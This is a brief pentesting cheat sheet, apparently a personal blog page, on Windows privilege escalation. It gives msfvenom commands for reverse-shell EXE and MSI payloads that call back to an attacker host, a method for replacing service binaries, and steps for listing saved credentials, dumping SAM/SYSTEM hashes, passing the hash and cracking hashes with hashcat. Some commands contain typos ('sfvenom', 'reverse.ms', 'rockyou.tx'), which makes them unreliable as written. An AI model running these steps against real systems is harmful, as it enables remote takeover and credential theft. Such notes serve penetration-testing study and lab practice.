---
title: Notes | Windows Privilage Escalation
author: Zeropio
date: 2022-04-25
categories: [Notes, System]
tags: [privilage-escalation, windows]
permalink: /notes/system/windows-pe
---

> Check the [Hacktricks](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation) checklist!
{: .prompt-tip }

---

# Vulnerable Software

Check in `C:\Program Files`{: .filepath} for some programs version.

---

# Insecure Windows Service Permissions
If we manage to find one Insecure Windows Service we can modify the executable file with one corrupted and wait to the service to execute (or by ourselves with *net start [service]*).
We can create a reverse shell with **msfvenom**:
```console
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerIP] LPORT=[port] -f exe -o reverse.exe
```
And change the **reverse.exe** name with the service.exe name.

---

# Saved Credentials
We can execute:
```console
> cmdkey /list
```
to get some credentials.

Or search in configuration, log or history files (**PSReadLine**).
Also, there can be some **Password Reuse**.

---

# SAM and SYSTEM
We can search for those files in ** C:\Windows\Repair**. With those we can get and crack the system's passwords.
For example with **creddump7**:
```console
> python3 creddump7/pwdump.py SYSTEM SAM
```

Then we can log in with the hash or break the hash:
```console
> pth-winexe -U 'admin%hash' //[ip] cmd.exe
```
```console
> hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.tx
```

---

# AlwaysInstalledElevated
If that property is set 1 (we can check it with: **reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevate**) we can create a msi with **msfvenom**:
```console
> sfvenom -p windows/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f msi -o reverse.ms
```

---

# Tools
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [JAWS](https://github.com/411Hall/JAWS)


